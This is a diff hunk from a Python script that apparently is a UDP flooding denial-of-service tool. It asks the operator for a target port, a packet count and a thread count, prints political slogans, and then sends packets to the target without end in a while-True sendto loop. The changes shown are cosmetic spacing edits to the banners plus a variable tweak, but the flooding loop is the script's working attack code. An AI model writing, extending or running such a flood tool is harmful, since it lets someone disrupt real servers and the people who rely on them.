@@ -39,18 +39,18 @@ port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
 packs = int(input("\033[92m[\033[96m+\033[92m]Packets{0} : "))
 thread = int(input("\033[92m[\033[97m+\033[92m]Threads : "))
 time.sleep(5),
-print("\033[96m[\033[31m+\033[1m] ⟩⟩DON'T \033[0m "),
+print("\033[96m[\033[31m+\033[91m]                     ⟩⟩ DON'T \033[0m "),
 time.sleep(5),
-print("\033[92m[\033[31m+\033[31m] ⟩⟩ STOP \033[0m "),
+print("\033[92m[\033[31m+\033[31m]                     ⟩⟩ STOP \033[0m "),
 time.sleep(5),
-print("\033[94m[\033[31m+\033[33m] ⟩⟩ FIGHT \033[0m "),
+print("\033[94m[\033[31m+\033[33m]                     ⟩⟩ FIGHT \033[0m "),
 time.sleep(5),
-print("\033[97m[\033[31m+\033[34m] ⟩⟩ FOR THE SAKE \033[0m "),
+print("\033[97m[\033[31m+\033[34m]                     ⟩⟩ FOR THE SAKE \033[0m "),
 time.sleep(5),
-print("\033[95m[\033[31m+\033[36m] ⟩⟩  FREE PALESTINE \033[0m ")
+print("\033[95m[\033[31m+\033[36m]                     ⟩⟩ FREE PALESTINE \033[0m ")
 
 sent = 0
-str = u
+str = 1
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
